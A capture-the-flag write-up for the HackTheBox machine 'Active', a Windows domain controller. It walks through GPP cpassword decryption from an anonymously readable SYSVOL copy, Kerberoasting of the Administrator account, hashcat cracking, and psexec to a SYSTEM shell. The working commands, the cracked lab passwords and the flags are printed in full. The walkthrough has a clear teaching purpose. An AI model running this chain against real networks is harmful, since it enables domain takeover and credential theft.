---
title: "Active"
date: 2025-06-20
categories:
  - HackTheBox
  - Active Directory
  - Windows
tags:
  - HackTheBox
  - Active Directory
---

# Active

![](assets/Pasted%20image%2020250504215455.png)
<!-- more -->

## Enumeration

```shell
$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.10.100  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-04 15:52 EDT
Nmap scan report for 10.10.10.100
Host is up (0.041s latency).
Not shown: 65408 closed tcp ports (reset), 104 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-04 19:52:20Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
49166/tcp open  msrpc         Microsoft Windows RPC
49168/tcp open  msrpc         Microsoft Windows RPC

Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-05-04T19:53:28
|_  start_date: 2025-05-04T10:07:23
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   41.86 ms 10.10.14.1
2   43.25 ms 10.10.10.100

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.93 seconds
```

Scan shares and we can read the `Replication` share, which is a copy of `SYSVOL`.

![](assets/Pasted%20image%2020250504225306.png)

Download everything inside:

```shell
$ smbclient -U '' -N  //10.10.10.100/Replication     
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  active.htb                          D        0  Sat Jul 21 06:37:44 2018

                5217023 blocks of size 4096. 277668 blocks available
smb: \> prompt off
smb: \> recurse on
smb: \> mget *
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
...
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (22.0 KiloBytes/sec) (average 7.1 KiloBytes/sec)
smb: \> exit
```

Search for the word `password`:

```shell
$ grep -r password .                                                 
./active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml:<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
```

`svc_tgs`:`edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ`

Using `gpp-decrypt`, decrypt the password:

```shell
$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

Check the credentials with `nxc`:

![](assets/Pasted%20image%2020250504225912.png)

Execute a Kerberoasting attack

```shell
$ impacket-GetUserSPNs active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2025-05-04 06:08:40.733372             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$954c2dd1af1d9abbf9845e070666b8b4$57026dea882c003e542e00d8534ddea461803edcb80d302396ecead8fdcc4a313b3382907b16c1cebaf9fd706d9e58db256b51a99ac415ef8217a9b5419641210b88be1d8a2230e99e2cbd076704ba69d06ba1f2802443c3dae3772189d2fa2af81a5d26d39fd773b17f66be6773f3ac504f1657840a5c99a7283c21b7a834fc3a95a6ca9815c1fba0f12fca66feee064a84623e158f5d52e3ccdafd3cd2279e8cb36bf8ac39cdc21649a95432d09eef07a28664c77e471aa408a20a346623276daa608edf39aebf68e70eecd8b91781e8faca7d69268f54de7f8f1dba25e2d580e588988156b5cb0b2680fe7f3394cd2036045d86651c6dff6bb32e66749a053d018d857e0cac3a9f00d5ef3ab23eee30cb525f30fd93b36d29f0ff050367dd28c041a851404875b986743efc2778618f691932b4cdbab9a53a1ca728b5a944fd805da628e9f915db31738f365761d2bc40889ee5e6110153f2ddbb5cc56ec37342cd99566a5284da7935b6bf81d2cd586367be7283b393b0690c6f119ea73b6695863909db0e84640488d163051fca2d38d84ab1e5778a7f6ebb175b18213dbf64af1dac87c4edb0493f13c39908bc1e240776ece203f4cb6b1f15ed17ea6876a89f02c06407aa4542a6d56d671fbda9587526f43636e4be709f32d464ae703b10e5624e7702fabf02188aee968f4d0e39ee29b34610cb25a8ccc0ffe5ebad92ef0c573868ffc277a6bd52a5ec6ac7c1d3f73d9d1b5854dc17f50cf5967bca5136fb006865fc4ac234fc4d3106551ae573aa5182a5fffee2069cce14744b0473e4d89dbaa1152f299af06a16236c8613e0676f6db22f74a907c0650a0f0671f6419a3627cbe7302a2d627524b8c3b1a8421f9158da85d1443328c302cf363e99a0f2b7b04e97ce4b675f2f18fc90f03e87152fee27cc77d752ba98957420c9865090e11bad0fc7e0740910129b7ee838c6e1688cc3135f8ed9b1d83f8516f247247ec7e27a9c22d9ac09a04da4f340ac98d1493d11bb48da90e59ca2d9af47222c34dcb17bf2591b3e35f82dc542e978badb7bab9cfaf716405905d46a3800b63b36b9f1f1d8c2f4b87a882788ff315e04bea27b6f5347a06ad6f8ba97f221a7fedd370256be50e45f7a032aeda6089a6dd00e13d1bb7818325ae2849a351b5e6f4960b17ab6c000074bc9bce31eca49a926c5bb1334de1a8adb85897c5343e939b7c7df355f128d2d40d6e3fc021b229c5ed5d586bc24b181
```

And using `hashcat`:

```shell
$ hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt --force  
hashcat (v6.2.6) starting
...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$954c2dd1af1d9abbf9845e070666b8b4$57026dea882c003e542e00d8534ddea461803edcb80d302396ecead8fdcc4a313b3382907b16c1cebaf9fd706d9e58db256b51a99ac415ef8217a9b5419641210b88be1d8a2230e99e2cbd076704ba69d06ba1f2802443c3dae3772189d2fa2af81a5d26d39fd773b17f66be6773f3ac504f1657840a5c99a7283c21b7a834fc3a95a6ca9815c1fba0f12fca66feee064a84623e158f5d52e3ccdafd3cd2279e8cb36bf8ac39cdc21649a95432d09eef07a28664c77e471aa408a20a346623276daa608edf39aebf68e70eecd8b91781e8faca7d69268f54de7f8f1dba25e2d580e588988156b5cb0b2680fe7f3394cd2036045d86651c6dff6bb32e66749a053d018d857e0cac3a9f00d5ef3ab23eee30cb525f30fd93b36d29f0ff050367dd28c041a851404875b986743efc2778618f691932b4cdbab9a53a1ca728b5a944fd805da628e9f915db31738f365761d2bc40889ee5e6110153f2ddbb5cc56ec37342cd99566a5284da7935b6bf81d2cd586367be7283b393b0690c6f119ea73b6695863909db0e84640488d163051fca2d38d84ab1e5778a7f6ebb175b18213dbf64af1dac87c4edb0493f13c39908bc1e240776ece203f4cb6b1f15ed17ea6876a89f02c06407aa4542a6d56d671fbda9587526f43636e4be709f32d464ae703b10e5624e7702fabf02188aee968f4d0e39ee29b34610cb25a8ccc0ffe5ebad92ef0c573868ffc277a6bd52a5ec6ac7c1d3f73d9d1b5854dc17f50cf5967bca5136fb006865fc4ac234fc4d3106551ae573aa5182a5fffee2069cce14744b0473e4d89dbaa1152f299af06a16236c8613e0676f6db22f74a907c0650a0f0671f6419a3627cbe7302a2d627524b8c3b1a8421f9158da85d1443328c302cf363e99a0f2b7b04e97ce4b675f2f18fc90f03e87152fee27cc77d752ba98957420c9865090e11bad0fc7e0740910129b7ee838c6e1688cc3135f8ed9b1d83f8516f247247ec7e27a9c22d9ac09a04da4f340ac98d1493d11bb48da90e59ca2d9af47222c34dcb17bf2591b3e35f82dc542e978badb7bab9cfaf716405905d46a3800b63b36b9f1f1d8c2f4b87a882788ff315e04bea27b6f5347a06ad6f8ba97f221a7fedd370256be50e45f7a032aeda6089a6dd00e13d1bb7818325ae2849a351b5e6f4960b17ab6c000074bc9bce31eca49a926c5bb1334de1a8adb85897c5343e939b7c7df355f128d2d40d6e3fc021b229c5ed5d586bc24b181:Ticketmaster1968
```

`administrator`:`Ticketmaster1968`

## Initial Access

```shell
$ impacket-psexec administrator:'Ticketmaster1968'@10.10.10.100        
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file qxjNwBni.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service SCDA on 10.10.10.100.....
[*] Starting service SCDA.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> 
```

## Post Exploitation

Get the flags:

```shell
C:\Users\SVC_TGS\Desktop> type user.txt
16bedad7cf00108e7d8e2f6915c1b507
C:\Users\Administrator\Desktop> type root.txt
9728f72dd3bb79cfa49b76a8c8f070e8
```
